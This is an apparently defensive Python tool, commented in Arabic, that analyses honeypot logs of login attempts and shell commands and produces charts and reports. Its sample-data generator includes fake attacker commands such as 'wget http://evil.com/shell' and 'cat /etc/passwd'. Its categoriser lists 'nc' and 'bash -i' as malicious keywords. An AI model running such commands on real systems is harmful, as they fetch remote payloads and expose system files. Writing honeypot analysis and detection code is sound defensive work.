#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Interactive Honeypot Data Analyzer
مشروع محلل بيانات مصيدة التسلل التفاعلي

الجزء الثاني: محلل البيانات مع الواجهة المرئية
"""

import json
import matplotlib.pyplot as plt
import pandas as pd
import seaborn as sns
from collections import Counter, defaultdict
import datetime
import os
import re
from typing import Dict, List, Any
import requests
import time

# إعداد matplotlib للنصوص العربية
plt.rcParams['font.family'] = ['DejaVu Sans', 'Arial Unicode MS', 'Tahoma']
plt.rcParams['axes.unicode_minus'] = False

class HoneypotAnalyzer:
    """
    محلل بيانات مصيدة التسلل مع إمكانيات التصور المرئي
    """
    
    def __init__(self, log_file: str = "honeypot_logs.json"):
        self.log_file = log_file
        self.data = []
        self.df = None
        
        # قوائم كلمات المرور والمستخدمين الشائعة للتحليل
        self.common_passwords = [
            '123456', 'password', 'admin', '123', 'root', 'toor', 
            'pass', '1234', '12345', 'qwerty', 'abc123', 'login'
        ]
        
        self.common_usernames = [
            'admin', 'root', 'user', 'test', 'guest', 'administrator',
            'pi', 'ubuntu', 'oracle', 'postgres', 'mysql'
        ]
    
    def load_data(self) -> bool:
        """
        تحميل البيانات من ملف السجل
        """
        if not os.path.exists(self.log_file):
            print(f"[ERROR] ملف السجل غير موجود: {self.log_file}")
            return False
        
        try:
            self.data = []
            with open(self.log_file, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if line:
                        try:
                            entry = json.loads(line)
                            self.data.append(entry)
                        except json.JSONDecodeError as e:
                            print(f"[WARNING] خطأ في قراءة السطر: {line[:50]}...")
            
            if self.data:
                self.df = pd.DataFrame(self.data)
                self.df['timestamp'] = pd.to_datetime(self.df['timestamp'])
                print(f"[SUCCESS] تم تحميل {len(self.data)} سجل")
                return True
            else:
                print("[WARNING] لا توجد بيانات في ملف السجل")
                return False
                
        except Exception as e:
            print(f"[ERROR] فشل في تحميل البيانات: {e}")
            return False
    
    def get_basic_stats(self) -> Dict[str, Any]:
        """
        الحصول على الإحصائيات الأساسية
        """
        if self.df is None or self.df.empty:
            return {}
        
        stats = {
            'total_interactions': len(self.df),
            'unique_ips': self.df['client_ip'].nunique(),
            'date_range': {
                'start': self.df['timestamp'].min(),
                'end': self.df['timestamp'].max()
            },
            'interaction_types': self.df['interaction_type'].value_counts().to_dict(),
            'most_active_ips': self.df['client_ip'].value_counts().head(10).to_dict()
        }
        
        return stats
    
    def analyze_credentials(self) -> Dict[str, Any]:
        """
        تحليل محاولات الدخول وكلمات المرور
        """
        if self.df is None:
            return {}
        
        # استخراج محاولات كلمات المرور
        password_attempts = self.df[
            self.df['interaction_type'] == 'password_attempt'
        ]['content'].tolist()
        
        usernames = []
        passwords = []
        
        for attempt in password_attempts:
            if ':' in attempt:
                username, password = attempt.split(':', 1)
                usernames.append(username.lower())
                passwords.append(password)
        
        analysis = {
            'total_login_attempts': len(password_attempts),
            'unique_usernames': len(set(usernames)),
            'unique_passwords': len(set(passwords)),
            'top_usernames': Counter(usernames).most_common(10),
            'top_passwords': Counter(passwords).most_common(10),
            'common_combinations': Counter(password_attempts).most_common(10)
        }
        
        return analysis
    
    def analyze_commands(self) -> Dict[str, Any]:
        """
        تحليل الأوامر المُنفذة
        """
        if self.df is None:
            return {}
        
        commands_df = self.df[self.df['interaction_type'] == 'command_execution']
        
        if commands_df.empty:
            return {'message': 'لا توجد أوامر مُنفذة في السجلات'}
        
        commands = commands_df['content'].tolist()
        
        # تصنيف الأوامر
        categories = {
            'reconnaissance': ['ls', 'pwd', 'whoami', 'ps', 'netstat', 'ifconfig'],
            'file_operations': ['cat', 'vi', 'nano', 'touch', 'rm', 'cp', 'mv'],
            'network': ['wget', 'curl', 'ping', 'nslookup', 'dig'],
            'system': ['uname', 'uptime', 'df', 'free', 'top', 'kill'],
            'malicious': ['rm -rf', 'chmod 777', '/tmp/', 'nc ', 'bash -i']
        }
        
        categorized_commands = defaultdict(list)
        
        for cmd in commands:
            cmd_lower = cmd.lower()
            categorized = False
            
            for category, keywords in categories.items():
                for keyword in keywords:
                    if keyword in cmd_lower:
                        categorized_commands[category].append(cmd)
                        categorized = True
                        break
                if categorized:
                    break
            
            if not categorized:
                categorized_commands['other'].append(cmd)
        
        analysis = {
            'total_commands': len(commands),
            'unique_commands': len(set(commands)),
            'command_frequency': Counter(commands).most_common(15),
            'categorized_commands': dict(categorized_commands),
            'category_counts': {cat: len(cmds) for cat, cmds in categorized_commands.items()}
        }
        
        return analysis
    
    def get_ip_geolocation(self, ip: str) -> Dict[str, str]:
        """
        الحصول على الموقع الجغرافي لعنوان IP (باستخدام خدمة مجانية)
        """
        try:
            # استخدام خدمة ipapi المجانية
            response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    return {
                        'country': data.get('country', 'Unknown'),
                        'city': data.get('city', 'Unknown'),
                        'region': data.get('regionName', 'Unknown'),
                        'isp': data.get('isp', 'Unknown')
                    }
        except Exception as e:
            print(f"[WARNING] فشل في الحصول على موقع {ip}: {e}")
        
        return {'country': 'Unknown', 'city': 'Unknown', 'region': 'Unknown', 'isp': 'Unknown'}
    
    def analyze_geographic_distribution(self) -> Dict[str, Any]:
        """
        تحليل التوزيع الجغرافي للهجمات
        """
        if self.df is None:
            return {}
        
        unique_ips = self.df['client_ip'].unique()[:20]  # أول 20 IP لتجنب تجاوز حدود API
        
        geo_data = []
        for ip in unique_ips:
            geo_info = self.get_ip_geolocation(ip)
            geo_info['ip'] = ip
            geo_info['attack_count'] = len(self.df[self.df['client_ip'] == ip])
            geo_data.append(geo_info)
            time.sleep(0.1)  # تجنب تجاوز حدود المعدل
        
        countries = [item['country'] for item in geo_data if item['country'] != 'Unknown']
        
        analysis = {
            'total_analyzed_ips': len(geo_data),
            'countries': Counter(countries).most_common(10),
            'detailed_data': geo_data
        }
        
        return analysis
    
    def create_visualizations(self):
        """
        إنشاء المخططات البيانية
        """
        if self.df is None or self.df.empty:
            print("[ERROR] لا توجد بيانات لإنشاء المخططات")
            return
        
        # إعداد الشكل
        fig = plt.figure(figsize=(20, 15))
        fig.suptitle('تحليل بيانات مصيدة التسلل - Honeypot Analysis Dashboard', fontsize=16, y=0.95)
        
        # 1. توزيع أنواع التفاعل
        plt.subplot(2, 3, 1)
        interaction_counts = self.df['interaction_type'].value_counts()
        plt.pie(interaction_counts.values, labels=interaction_counts.index, autopct='%1.1f%%')
        plt.title('توزيع أنواع التفاعل')
        
        # 2. أكثر عناوين IP نشاطاً
        plt.subplot(2, 3, 2)
        top_ips = self.df['client_ip'].value_counts().head(10)
        plt.barh(range(len(top_ips)), top_ips.values)
        plt.yticks(range(len(top_ips)), top_ips.index)
        plt.xlabel('عدد التفاعلات')
        plt.title('أكثر 10 عناوين IP نشاطاً')
        
        # 3. التوزيع الزمني للهجمات
        plt.subplot(2, 3, 3)
        self.df['hour'] = self.df['timestamp'].dt.hour
        hourly_attacks = self.df['hour'].value_counts().sort_index()
        plt.plot(hourly_attacks.index, hourly_attacks.values, marker='o')
        plt.xlabel('الساعة من اليوم')
        plt.ylabel('عدد التفاعلات')
        plt.title('التوزيع الزمني للتفاعلات (24 ساعة)')
        plt.xticks(range(0, 24, 2))
        plt.grid(True, alpha=0.3)
        
        # 4. تحليل محاولات كلمات المرور
        plt.subplot(2, 3, 4)
        password_attempts = self.df[self.df['interaction_type'] == 'password_attempt']
        if not password_attempts.empty:
            passwords = []
            for attempt in password_attempts['content']:
                if ':' in attempt:
                    _, password = attempt.split(':', 1)
                    passwords.append(password)
            
            if passwords:
                top_passwords = Counter(passwords).most_common(8)
                plt.bar(range(len(top_passwords)), [count for _, count in top_passwords])
                plt.xticks(range(len(top_passwords)), [pwd for pwd, _ in top_passwords], rotation=45)
                plt.ylabel('عدد المحاولات')
                plt.title('أكثر كلمات المرور المُجربة')
        
        # 5. تحليل الأوامر المُنفذة
        plt.subplot(2, 3, 5)
        commands = self.df[self.df['interaction_type'] == 'command_execution']
        if not commands.empty:
            top_commands = commands['content'].value_counts().head(8)
            plt.bar(range(len(top_commands)), top_commands.values)
            plt.xticks(range(len(top_commands)), top_commands.index, rotation=45)
            plt.ylabel('عدد التنفيذات')
            plt.title('أكثر الأوامر تنفيذاً')
        
        # 6. إحصائيات الجلسات
        plt.subplot(2, 3, 6)
        session_stats = self.df.groupby('session_id').size()
        plt.hist(session_stats.values, bins=20, alpha=0.7)
        plt.xlabel('عدد التفاعلات لكل جلسة')
        plt.ylabel('عدد الجلسات')
        plt.title('توزيع طول الجلسات')
        
        plt.tight_layout()
        plt.savefig('honeypot_analysis.png', dpi=300, bbox_inches='tight')
        plt.show()
    
    def generate_report(self) -> str:
        """
        إنشاء تقرير نصي شامل
        """
        if not self.load_data():
            return "فشل في تحميل البيانات"
        
        basic_stats = self.get_basic_stats()
        credentials_analysis = self.analyze_credentials()
        commands_analysis = self.analyze_commands()
        
        report = []
        report.append("=" * 80)
        report.append("🍯 تقرير تحليل بيانات مصيدة التسلل - Honeypot Analysis Report")
        report.append("=" * 80)
        report.append(f"تاريخ التقرير: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        report.append("")
        
        # الإحصائيات الأساسية
        if basic_stats:
            report.append("📊 الإحصائيات الأساسية:")
            report.append("-" * 40)
            report.append(f"• إجمالي التفاعلات: {basic_stats['total_interactions']}")
            report.append(f"• عناوين IP فريدة: {basic_stats['unique_ips']}")
            
            if basic_stats['date_range']['start']:
                report.append(f"• فترة النشاط: من {basic_stats['date_range']['start'].strftime('%Y-%m-%d %H:%M')} إلى {basic_stats['date_range']['end'].strftime('%Y-%m-%d %H:%M')}")
            
            report.append("")
            report.append("🔥 أكثر عناوين IP نشاطاً:")
            for ip, count in list(basic_stats['most_active_ips'].items())[:5]:
                report.append(f"   {ip}: {count} تفاعل")
            report.append("")
        
        # تحليل محاولات الدخول
        if credentials_analysis and credentials_analysis.get('total_login_attempts', 0) > 0:
            report.append("🔐 تحليل محاولات الدخول:")
            report.append("-" * 40)
            report.append(f"• إجمالي محاولات الدخول: {credentials_analysis['total_login_attempts']}")
            report.append(f"• أسماء مستخدمين فريدة: {credentials_analysis['unique_usernames']}")
            report.append(f"• كلمات مرور فريدة: {credentials_analysis['unique_passwords']}")
            report.append("")
            
            report.append("👤 أكثر أسماء المستخدمين:")
            for username, count in credentials_analysis['top_usernames'][:5]:
                report.append(f"   {username}: {count} محاولة")
            report.append("")
            
            report.append("🔑 أكثر كلمات المرور:")
            for password, count in credentials_analysis['top_passwords'][:5]:
                report.append(f"   {password}: {count} محاولة")
            report.append("")
        
        # تحليل الأوامر
        if commands_analysis and commands_analysis.get('total_commands', 0) > 0:
            report.append("💻 تحليل الأوامر المُنفذة:")
            report.append("-" * 40)
            report.append(f"• إجمالي الأوامر: {commands_analysis['total_commands']}")
            report.append(f"• أوامر فريدة: {commands_analysis['unique_commands']}")
            report.append("")
            
            report.append("⚡ أكثر الأوامر تنفيذاً:")
            for command, count in commands_analysis['command_frequency'][:8]:
                report.append(f"   {command}: {count} مرة")
            report.append("")
            
            if commands_analysis.get('category_counts'):
                report.append("📁 تصنيف الأوامر:")
                for category, count in commands_analysis['category_counts'].items():
                    if count > 0:
                        category_name = {
                            'reconnaissance': 'استطلاع النظام',
                            'file_operations': 'عمليات الملفات',
                            'network': 'شبكات',
                            'system': 'نظام',
                            'malicious': 'مشبوهة',
                            'other': 'أخرى'
                        }.get(category, category)
                        report.append(f"   {category_name}: {count} أمر")
                report.append("")
        
        # تحليل الأنماط الزمنية
        if self.df is not None:
            report.append("⏰ التحليل الزمني:")
            report.append("-" * 40)
            
            # أكثر الأيام نشاطاً
            daily_activity = self.df.groupby(self.df['timestamp'].dt.date).size()
            if not daily_activity.empty:
                busiest_day = daily_activity.idxmax()
                busiest_count = daily_activity.max()
                report.append(f"• أكثر الأيام نشاطاً: {busiest_day} ({busiest_count} تفاعل)")
            
            # أكثر الساعات نشاطاً
            hourly_activity = self.df.groupby(self.df['timestamp'].dt.hour).size()
            if not hourly_activity.empty:
                busiest_hour = hourly_activity.idxmax()
                busiest_hour_count = hourly_activity.max()
                report.append(f"• أكثر الساعات نشاطاً: {busiest_hour}:00 ({busiest_hour_count} تفاعل)")
            report.append("")
        
        # توصيات أمنية
        report.append("🛡️ التوصيات الأمنية:")
        report.append("-" * 40)
        
        if credentials_analysis.get('total_login_attempts', 0) > 0:
            # فحص كلمات المرور الضعيفة
            weak_passwords = 0
            for password, count in credentials_analysis.get('top_passwords', []):
                if password.lower() in self.common_passwords or len(password) < 6:
                    weak_passwords += count
            
            if weak_passwords > 0:
                report.append(f"• تم رصد {weak_passwords} محاولة باستخدام كلمات مرور ضعيفة")
                report.append("• يُنصح باستخدام كلمات مرور قوية ومعقدة")
            
            # فحص أسماء المستخدمين الشائعة
            common_usernames_found = 0
            for username, count in credentials_analysis.get('top_usernames', []):
                if username in self.common_usernames:
                    common_usernames_found += count
            
            if common_usernames_found > 0:
                report.append(f"• تم رصد {common_usernames_found} محاولة باستخدام أسماء مستخدمين شائعة")
                report.append("• يُنصح بتجنب أسماء المستخدمين المعروفة مثل admin, root")
        
        if commands_analysis.get('category_counts', {}).get('malicious', 0) > 0:
            report.append("• تم رصد أوامر مشبوهة - يُنصح بتعزيز أمان النظام")
        
        if basic_stats.get('unique_ips', 0) > 10:
            report.append("• عدد كبير من عناوين IP المختلفة - قد يشير لهجمات موزعة")
            report.append("• يُنصح بتطبيق قواعد جدار حماية صارمة")
        
        report.append("")
        report.append("=" * 80)
        report.append("انتهى التقرير - تم إنشاؤه بواسطة محلل مصيدة التسلل")
        report.append("=" * 80)
        
        return "\n".join(report)
    
    def export_to_csv(self, filename: str = "honeypot_analysis.csv"):
        """
        تصدير البيانات إلى ملف CSV
        """
        if self.df is None:
            print("[ERROR] لا توجد بيانات لتصديرها")
            return False
        
        try:
            self.df.to_csv(filename, index=False, encoding='utf-8-sig')
            print(f"[SUCCESS] تم تصدير البيانات إلى: {filename}")
            return True
        except Exception as e:
            print(f"[ERROR] فشل في تصدير البيانات: {e}")
            return False

def create_sample_data():
    """
    إنشاء بيانات تجريبية لاختبار المحلل
    """
    import random
    
    sample_ips = ['192.168.1.100', '10.0.0.15', '172.16.1.50', '203.0.113.10', '198.51.100.25']
    sample_usernames = ['admin', 'root', 'user', 'test', 'guest', 'pi']
    sample_passwords = ['123456', 'password', 'admin', 'root', '123', 'qwerty']
    sample_commands = ['ls', 'pwd', 'whoami', 'ps', 'cat /etc/passwd', 'wget http://evil.com/shell']
    
    sample_data = []
    
    for i in range(100):
        ip = random.choice(sample_ips)
        session_id = f"session_{int(time.time())}_{i}"
        timestamp = datetime.datetime.now() - datetime.timedelta(hours=random.randint(0, 72))
        
        # اتصال جديد
        sample_data.append({
            "timestamp": timestamp.isoformat(),
            "client_ip": ip,
            "client_port": random.randint(30000, 65000),
            "session_id": session_id,
            "interaction_type": "connection_established",
            "content": "New connection established",
            "response_sent": ""
        })
        
        # محاولة اسم مستخدم
        username = random.choice(sample_usernames)
        sample_data.append({
            "timestamp": (timestamp + datetime.timedelta(seconds=1)).isoformat(),
            "client_ip": ip,
            "client_port": random.randint(30000, 65000),
            "session_id": session_id,
            "interaction_type": "username_attempt",
            "content": username,
            "response_sent": ""
        })
        
        # محاولة كلمة مرور
        password = random.choice(sample_passwords)
        sample_data.append({
            "timestamp": (timestamp + datetime.timedelta(seconds=3)).isoformat(),
            "client_ip": ip,
            "client_port": random.randint(30000, 65000),
            "session_id": session_id,
            "interaction_type": "password_attempt",
            "content": f"{username}:{password}",
            "response_sent": ""
        })
        
        # بعض الأوامر
        if random.random() > 0.3:  # 70% احتمال نجاح الدخول
            for _ in range(random.randint(1, 5)):
                command = random.choice(sample_commands)
                sample_data.append({
                    "timestamp": (timestamp + datetime.timedelta(seconds=random.randint(5, 30))).isoformat(),
                    "client_ip": ip,
                    "client_port": random.randint(30000, 65000),
                    "session_id": session_id,
                    "interaction_type": "command_execution",
                    "content": command,
                    "response_sent": ""
                })
    
    # حفظ البيانات التجريبية
    with open("honeypot_logs.json", "w", encoding='utf-8') as f:
        for entry in sample_data:
            f.write(json.dumps(entry, ensure_ascii=False) + '\n')
    
    print(f"[SUCCESS] تم إنشاء {len(sample_data)} سجل تجريبي في honeypot_logs.json")

def main():
    """
    الدالة الرئيسية لتشغيل محلل البيانات
    """
    print("=" * 80)
    print("📊 محلل بيانات مصيدة التسلل - Honeypot Data Analyzer")
    print("=" * 80)
    print()
    
    analyzer = HoneypotAnalyzer()
    
    while True:
        print("\nاختر العملية المطلوبة:")
        print("1. تحليل البيانات وإنشاء تقرير")
        print("2. إنشاء المخططات البيانية")
        print("3. تصدير البيانات إلى CSV")
        print("4. إنشاء بيانات تجريبية (للاختبار)")
        print("5. عرض الإحصائيات السريعة")
        print("0. خروج")
        
        choice = input("\nأدخل اختيارك (0-5): ").strip()
        
        if choice == "1":
            print("\n" + "="*50)
            print("إنشاء التقرير...")
            report = analyzer.generate_report()
            print(report)
            
            # حفظ التقرير في ملف
            with open("honeypot_report.txt", "w", encoding='utf-8') as f:
                f.write(report)
            print(f"\n[SUCCESS] تم حفظ التقرير في: honeypot_report.txt")
        
        elif choice == "2":
            print("\nإنشاء المخططات البيانية...")
            if analyzer.load_data():
                try:
                    analyzer.create_visualizations()
                    print("[SUCCESS] تم إنشاء المخططات وحفظها في: honeypot_analysis.png")
                except Exception as e:
                    print(f"[ERROR] فشل في إنشاء المخططات: {e}")
            else:
                print("[ERROR] فشل في تحميل البيانات")
        
        elif choice == "3":
            print("\nتصدير البيانات إلى CSV...")
            if analyzer.load_data():
                analyzer.export_to_csv()
            else:
                print("[ERROR] فشل في تحميل البيانات")
        
        elif choice == "4":
            print("\nإنشاء بيانات تجريبية...")
            create_sample_data()
        
        elif choice == "5":
            print("\nالإحصائيات السريعة:")
            print("-" * 30)
            if analyzer.load_data():
                stats = analyzer.get_basic_stats()
                if stats:
                    print(f"إجمالي التفاعلات: {stats['total_interactions']}")
                    print(f"عناوين IP فريدة: {stats['unique_ips']}")
                    print("أنواع التفاعل:")
                    for interaction_type, count in stats['interaction_types'].items():
                        print(f"  - {interaction_type}: {count}")
            else:
                print("فشل في تحميل البيانات")
        
        elif choice == "0":
            print("شكراً لاستخدام محلل بيانات مصيدة التسلل!")
            break
        
        else:
            print("اختيار غير صحيح، حاول مرة أخرى.")

if __name__ == "__main__":
    main()